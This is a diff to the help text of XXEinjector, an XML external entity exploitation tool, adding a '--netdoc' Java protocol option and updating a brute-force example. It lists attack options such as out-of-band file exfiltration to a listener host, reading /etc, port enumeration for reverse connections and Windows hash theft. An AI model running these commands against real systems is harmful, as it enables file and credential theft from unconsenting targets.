@@ -12,6 +12,7 @@ Options:<br />
   --direct  Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)<br />
   --2ndfile		File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)<br />
   --phpfilter		Use PHP filter to base64 encode target file before sending.<br />
+  --netdoc    Use netdoc protocol instead of file (Java).<br />
   --enumports		Enumerating unfiltered ports for reverse connection. Specify value "all" to enumerate all TCP ports. (--enumports=21,22,80,443,445)<br />
 
   --hashes	Steals Windows hash of the user that runs an application.<br />
@@ -41,8 +42,8 @@ Example usage:<br />
   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher<br />
   Second order exploitation:<br />
   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt<br />
-  Bruteforcing files using HTTP out of band method:<br />
-  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http<br />
+  Bruteforcing files using HTTP out of band method and netdoc protocol:<br />
+  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc<br />
   Enumerating using direct exploitation:<br />
   ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK<br />
   Enumerating unfiltered ports:<br />
